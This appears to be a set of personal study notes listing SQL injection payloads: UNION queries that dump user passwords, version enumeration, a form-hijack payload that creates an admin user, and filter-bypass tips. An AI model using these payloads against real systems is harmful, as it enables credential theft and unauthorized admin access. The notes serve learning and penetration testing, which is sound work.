# SQLi notes

#### To jump to other tables:
`' UNION SELECT username, password FROM users--`

#### Enumerate database columns
`SELECT * FROM information_schema.tables`

#### Grab DB name
`%’ or 0=0 union select null, database() #`

#### Grab all column contents
`%’ and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users # Click Submit`

#### Grab a pw
`1 or 1 =1 union Select 1, password from users`
`1'union select null, concat_ws (char (32,58,32), user, password) from users #`

#### Enumerate vesrion:
`SELECT * FROM v$version`
`SELECT @@version`
`SELECT version()`

#### Create your own user:
`INSERT INTO users (username, password, ID, privs) VALUES ('nuadmin','pass',2248,1)`

#### Hijack user creation form to create a user with admin privs:
`nuadmin', 'pass', 9999, 0)--`

#### Enumerating columns:
Consider an online user search, its statement would be something like:

`SELECT * FROM users WHERE ID=1`

To enumerate what we can union select, we can add a union select, and keep adding columns until we no longer get errors.

`ID=1 UNION SELECT 1,2--` OR `ID=1 ORDER BY 4` OR `GROUP BY 1,2,3,4,5,6,7,8,9,10`

If data from only first part of query is returned, we can invalidate it:

`ID=1 AND 1=2 UNION SELECT 1,2,3--`

If this returns our own values, we can start emumerating sys info:

`id=1 and 1=2 union select version(), user(),3`

#### Quick tips:
space sanitisation can be defeated with `/**/`

sometimes adding a comment at the end of query can complete the injection `--` `#` `--+-`

Sometimes a webpage will take a parameter as a string, not an int - in which case we close the quotes so our entire injection isnt considered one string:

`SELECT * FROM users WHERE ID=1'` *Remember you may need to close the attack with another apostrophe*

`UNION` only selects distnict, use `UNION ALL` to select duplicates

To begin an attack, try to break the string with an invalidation
Pay attention to the backend use of single and double quotes in errors

#### BlindSQL:
Truth must be "infered" generally with a sleep function
